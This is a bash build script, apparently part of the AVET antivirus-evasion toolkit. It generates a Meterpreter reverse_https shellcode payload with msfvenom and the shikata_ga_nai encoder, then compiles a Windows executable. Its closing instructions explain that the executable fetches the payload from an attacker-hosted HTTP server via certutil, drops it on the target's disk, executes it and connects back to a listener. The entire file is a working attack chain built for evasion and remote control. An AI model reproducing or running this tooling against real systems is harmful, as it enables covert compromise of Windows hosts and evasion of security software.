#!/bin/bash          


#DESCRIPTION_START
# Apply shikata, download your payload via certutil.
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# enable debug output
enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > output/thepayload.bin

# set shellcode source
set_payload_source download_certutil

# set decoder and key source
set_decoder none
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# compile to exe file
$win32_compiler -o output/downloadcertutil_revhttps_win32.exe source/avet.c
strip output/downloadcertutil_revhttps_win32.exe

# cleanup
cleanup_techniques


echo "
# The generated msf payload needs to be hosted on a HTTP server
# Call your payload like:
# $ downloadcertutil_revhttps_win32.exe http://myserver/thepayload.bin

# The executable will download and drop the payload as a file on the target's disk.
# It will then execute the shellcode given in the file.
"
